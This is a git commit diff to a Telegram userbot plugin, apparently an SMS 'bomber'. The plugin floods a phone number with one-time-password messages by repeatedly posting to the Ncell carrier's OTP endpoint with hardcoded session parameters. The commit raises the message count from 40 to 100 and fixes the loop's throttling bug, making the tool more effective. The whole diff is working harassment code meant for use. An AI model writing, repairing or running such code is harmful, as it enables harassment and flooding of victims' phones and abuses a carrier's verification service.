742b1dbfd79b43bc942b8416f689dd3d762beb3f
scifidemon <46400922+scifidemon@users.noreply.github.com>
2020-03-28 14:15:05 +0545

    Some small fixes

--- userbot/plugins/bomber1.py
+++ userbot/plugins/bomber1.py
@@ -7,7 +7,7 @@ from time import sleep
 @borg.on(admin_cmd("ncell (.*)"))
 async def _(event):
     num=0
-    n=40
+    n=100
     input_str = event.pattern_match.group(1)
     if input_str:
         num = int(input_str)
@@ -17,7 +17,7 @@ async def _(event):
     paramss={'wms':"e1uzvl3s3hntx4454dfvmn55","TS01a172b1":"018487e1530a540e474e0137e23b284713af2737f277635c2da93bf07dc84da5910b0d04ff7d8c23565466793befeb88e9d243d325e25e85b563e176ece81ab22d98133d4f","ws":'CRBT','type':'SEND_OTP','promo':'DWN','cattype':'RB','cid':'104061','tmpl':'22','mobile':num}
     await event.edit("`Bombing....`")
     for i in range (n):
-        if n%5==0:
+        if i%5==0:
             sleep(1)
         else:
             requests.post("https://prbt.ncell.axiata.com/Handlers/OTPActions.ashx?lang=ENGL",params=paramss)
